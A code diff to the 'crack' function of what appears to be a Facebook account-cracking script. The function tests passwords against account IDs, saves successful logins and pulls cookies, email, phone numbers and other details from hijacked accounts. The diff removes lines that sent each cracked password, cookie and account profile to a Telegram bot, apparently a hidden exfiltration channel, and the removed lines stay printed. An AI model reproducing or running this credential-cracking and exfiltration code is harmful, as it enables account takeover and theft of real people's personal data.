@@ -1455,7 +1455,7 @@ def crack(idf,pwv):
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
-					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))
+					
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				headapp={"user-agent":"NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
@@ -1511,10 +1511,10 @@ def crack(idf,pwv):
 
 					infoakun += f'''𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𖤍
 ⋘─────━⚜️ 𝑹𝑴𝑨𝑫 ⚜️━─────⋙
-𖤍 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n𖤍 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n𖤍 - Jumlah Teman : {teman}\n𖤍 - Jumlah Pengikut : {pengikut}\n𖤍 - Email Aktif : {email}\n𖤍 - Nomor Aktif : {nomer}\n𖤍 - Tahun Akun : {tahun}\n𖤍 - Tanggal Lahir : {ttl}\n⋘─────━⚜️ 𝑹𝑴𝑨𝑫 ⚜️━─────⋙
+𖤍 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n𖤍 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n𖤍 - Jumlah Teman : {teman}\n𖤍 - Jumlah Pengikut : {pengikut}\n𖤍 - Email Aktif : {email}\n𖤍 - Nomor Aktif : {nomer}\n𖤍 - Tahun Akun : {tahun}\n𖤍 - Tanggal Lahir : {cek_RMAD}\n⋘─────━⚜️ 𝑹𝑴𝑨𝑫 ⚜️━─────⋙
 ⌯ - 𝗖𝗢𝗢𝗞𝗜𝗘𝗦   ¦ \n {kuki}
 @R_M_D || @N_9_N_6'''
-					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))
+					
 
 					hit1, hit2 = 0,0
 					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
@@ -1546,7 +1546,7 @@ def crack(idf,pwv):
 					print('\n')
 					statusok = f'''𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𖤍
 ⋘─────━⚜️ 𝑹𝑴𝑨𝑫 ⚜️━─────⋙
-𖤍 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n𖤍 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n𖤍 - Jumlah Teman : {teman}\n𖤍 - Jumlah Pengikut : {pengikut}\n𖤍 - Email Aktif : {email}\n𖤍 - Nomor Aktif : {nomer}\n𖤍 - Tahun Akun : {tahun}\n𖤍 - Tanggal Lahir : {ttl}\n⋘─────━⚜️ 𝑹𝑴𝑨𝑫 ⚜️━─────⋙
+𖤍 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n𖤍 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n𖤍 - Jumlah Teman : {teman}\n𖤍 - Jumlah Pengikut : {pengikut}\n𖤍 - Email Aktif : {email}\n𖤍 - Nomor Aktif : {nomer}\n𖤍 - Tahun Akun : {tahun}\n𖤍 - Tanggal Lahir : {cek_RMAD}\n⋘─────━⚜️ 𝑹𝑴𝑨𝑫 ⚜️━─────⋙
 ⌯ - 𝗖𝗢𝗢𝗞𝗜𝗘𝗦   ¦ \n {kuki}
 @R_M_D || @N_9_N_6'''
 					statusok1 = nel(statusok, style='green')
